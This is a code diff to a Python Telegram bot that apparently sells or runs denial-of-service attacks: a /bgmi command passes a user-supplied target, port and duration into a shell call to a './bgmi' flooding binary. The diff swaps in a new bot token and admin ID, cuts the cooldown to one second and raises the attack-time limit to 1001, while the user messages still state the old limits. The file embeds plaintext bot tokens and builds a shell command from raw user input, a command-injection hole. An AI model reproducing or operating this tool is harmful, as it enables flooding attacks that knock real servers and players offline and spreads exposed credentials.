@@ -66,10 +66,10 @@ import os
 # Join :- @rzrdevil #from keep_alive import keep_alive
 # Join :- @rzrdevil #keep_alive()
 # Join :- @rzrdevil # insert your Telegram bot token here
-bot = telebot.TeleBot('7380545637:AAEKIL8WyC_nIOeiiRrbbVH_F84m03iHk60')
+bot = telebot.TeleBot('7489171387:AAFmUuYLqKyyFKtxVhMKeKCIrzAN9uTX9uA')
 
 # Join :- @rzrdevil # Admin user IDs
-admin_id = ["1328107711","1908095816","1537783826"]
+admin_id = ["5411404064"]
 
 # Join :- @rzrdevil # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -470,7 +470,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: @RZRDEVIL"
     bot.reply_to(message, response)
 
 # Join :- @rzrdevil # Dictionary to store the last time each user ran the /bgmi command
@@ -486,7 +486,7 @@ def handle_bgmi(message):
         # Join :- @rzrdevil # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Join :- @rzrdevil # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 120:
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 1:
                 response = "You Are On Cooldown . Please Wait 2min Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
@@ -498,7 +498,7 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Join :- @rzrdevil # Convert time to integer
             time = int(command[3])  # Join :- @rzrdevil # Convert port to integer
-            if time > 240:
+            if time > 1001:
                 response = "Error: Time interval must be less than 180."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
@@ -506,7 +506,7 @@ def handle_bgmi(message):
                 start_attack_reply(message, target, port, time)  # Join :- @rzrdevil # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 500"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Join :- @rzrdevil # Updated command syntax
     else:
